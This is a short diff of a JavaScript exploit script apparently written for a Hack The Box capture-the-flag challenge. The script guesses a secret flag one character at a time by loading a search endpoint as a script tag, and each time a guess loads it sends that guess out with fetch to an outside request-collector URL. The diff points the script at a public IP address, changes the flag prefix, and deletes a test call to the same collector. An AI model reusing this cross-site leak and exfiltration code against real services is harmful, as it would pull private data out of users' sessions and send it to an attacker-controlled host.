@@ -4,9 +4,9 @@ var chars =
 var special = "_";
 var charLen = chars.length;
 var ENDPOINT =
-	"http://127.0.0.1:30753//api/entries/search?q=";
+	"http://161.35.173.232:30753/api/entries/search?q=";
 
-var flag = "HTB{";
+var flag = "B";
 
 const getPartial = (char) => {
 	return new Promise((resolve, reject) => {
@@ -15,6 +15,7 @@ const getPartial = (char) => {
 		document.head.appendChild(script);
 
 		script.onload = () => {
+			console.log("onload triggered");
 			fetch(
 				"https://enancxlxuxj2.x.pipedream.net/flag=" +
 					encodeURIComponent(flag + char),
@@ -57,12 +58,5 @@ const exploit = async () => {
 		}
 	}
 };
-fetch(
-				"https://enancxlxuxj2.x.pipedream.net/flag=" +
-					"test",
-				{
-					method: "GET",
-					mode: "no-cors",
-				}
-			);
+
 exploit();
